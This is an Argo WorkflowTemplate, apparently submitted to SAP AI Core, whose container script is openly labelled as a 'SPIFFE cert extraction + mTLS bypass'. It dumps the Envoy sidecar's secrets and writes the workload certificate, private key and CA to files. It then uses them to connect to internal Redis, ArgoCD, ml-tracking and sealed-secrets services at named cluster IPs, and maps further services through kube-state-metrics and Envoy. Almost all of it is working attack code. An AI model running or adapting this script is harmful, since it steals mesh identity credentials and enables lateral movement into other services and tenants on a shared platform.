apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "20.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V20 SPIFFE CERT EXTRACTION + MTLS BYPASS ==="
        
        # === EXTRACT CERTS FROM ENVOY SDS ===
        echo "=== SDS SECRET DUMP ==="
        
        # Get dynamic secrets from Envoy config_dump
        SDS=$(curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1)
        echo "SDS_BYTES=$(echo "$SDS" | wc -c)"
        
        # Extract the cert and key from SDS
        echo "$SDS" | python3 -c "
import sys, json, base64
try:
    data = json.load(sys.stdin)
    configs = data.get('configs', [])
    for config in configs:
        for secret in config.get('dynamic_active_secrets', config.get('secrets', [])):
            name = secret.get('name', 'unknown')
            print(f'SECRET: {name}')
            tls_cert = secret.get('secret', {}).get('tls_certificate', {})
            # Extract cert chain
            cert_chain = tls_cert.get('certificate_chain', {})
            if 'inline_bytes' in cert_chain:
                cert_pem = base64.b64decode(cert_chain['inline_bytes']).decode()
                with open('/tmp/istio-cert.pem', 'w') as f:
                    f.write(cert_pem)
                print(f'CERT EXTRACTED ({len(cert_pem)} bytes)')
                print(cert_pem[:500])
            # Extract private key
            priv_key = tls_cert.get('private_key', {})
            if 'inline_bytes' in priv_key:
                key_pem = base64.b64decode(priv_key['inline_bytes']).decode()
                with open('/tmp/istio-key.pem', 'w') as f:
                    f.write(key_pem)
                print(f'KEY EXTRACTED ({len(key_pem)} bytes)')
                print('-----BEGIN EC PRIVATE KEY-----' if 'EC' in key_pem else '-----BEGIN RSA PRIVATE KEY-----')
            # Extract CA cert (trusted_ca / validation_context)
            val_ctx = secret.get('secret', {}).get('validation_context', {})
            ca = val_ctx.get('trusted_ca', {})
            if 'inline_bytes' in ca:
                ca_pem = base64.b64decode(ca['inline_bytes']).decode()
                with open('/tmp/istio-ca.pem', 'w') as f:
                    f.write(ca_pem)
                print(f'CA CERT EXTRACTED ({len(ca_pem)} bytes)')
except Exception as e:
    print(f'PARSE ERROR: {e}')
    # Try raw extraction
    pass
" 2>&1
        echo ""
        
        # Also check SPIFFE UDS socket
        echo "=== SPIFFE UDS ==="
        ls -la ./var/run/secrets/workload-spiffe-uds/ 2>/dev/null || echo "No SPIFFE UDS at relative path"
        ls -la /var/run/secrets/workload-spiffe-uds/ 2>/dev/null || echo "No SPIFFE UDS at absolute path"
        find / -name "workload-spiffe*" -o -name "*.sock" 2>/dev/null | head -10
        echo ""
        
        # Check if certs were extracted
        if [ -f /tmp/istio-cert.pem ] && [ -f /tmp/istio-key.pem ]; then
          echo "=== MTLS CONNECTIONS ==="
          
          # openssl s_client to verify cert works
          echo "--- OpenSSL verify ---"
          openssl x509 -in /tmp/istio-cert.pem -text -noout 2>&1 | head -20
          echo ""
          
          # Try mTLS to Redis
          echo "--- mTLS to redis.aicore (100.107.100.17:6379) ---"
          timeout 5 openssl s_client -connect 100.107.100.17:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem             -servername outbound_.6379_._.redis.aicore.svc.cluster.local 2>&1 | head -30
          echo ""
          
          # Try mTLS + Redis PING
          echo "--- mTLS Redis PING ---"
          echo -e "PING
" | timeout 5 openssl s_client -connect 100.107.100.17:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem -quiet 2>&1 | head -10
          echo ""
          
          # Try mTLS to user-management Redis
          echo "--- mTLS to redis.user-management (100.109.69.212:6379) ---"
          echo -e "PING
INFO server
" | timeout 5 openssl s_client -connect 100.109.69.212:6379             -cert /tmp/istio-cert.pem -key /tmp/istio-key.pem             -CAfile /tmp/istio-ca.pem -quiet 2>&1 | head -30
          echo ""
          
          # Try mTLS to ml-tracking
          echo "--- mTLS to ml-tracking ---"
          curl -s --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem             "https://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
          echo ""
          
          # Try mTLS to ArgoCD
          echo "--- mTLS to ArgoCD (100.107.174.75:443) ---"
          curl -s --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem             "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 1000
          echo ""
          
          # Try mTLS to sealed-secrets
          echo "--- Sealed secrets pod info ---"
          # Get sealed-secrets IP from KSM
          SS_IP=$(curl -s "http://100.106.241.163:8080/metrics" 2>&1 | grep 'kube_pod_info.*sealed-secrets' | head -1 | grep -oE 'pod_ip="[^"]+"' | cut -d'"' -f2)
          echo "Sealed secrets pod IP: $SS_IP"
          if [ -n "$SS_IP" ]; then
            echo "--- mTLS to sealed-secrets ---"
            curl -sk --connect-timeout 5 --cert /tmp/istio-cert.pem --key /tmp/istio-key.pem --cacert /tmp/istio-ca.pem               "https://$SS_IP:8080/v1/cert.pem" 2>&1 | head -c 500
            echo ""
          fi
        else
          echo "CERT EXTRACTION FAILED - trying alternate methods"
          
          # Try /certs endpoint raw dump
          echo "--- Raw certs dump ---"
          curl -s "http://localhost:15000/certs" 2>&1 | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print(json.dumps(d, indent=2)[:3000])
except:
    print(sys.stdin.read()[:3000])
" 2>&1
        fi
        
        # === ENVOY CLUSTER DUMP (extract service IPs) ===
        echo "=== SERVICE MAP ==="
        curl -s "http://localhost:15000/clusters" 2>&1 | grep -E "^outbound" | grep "::hostname::" | sort -u | head -50
        echo ""
        
        echo "=== V20 COMPLETE ==="
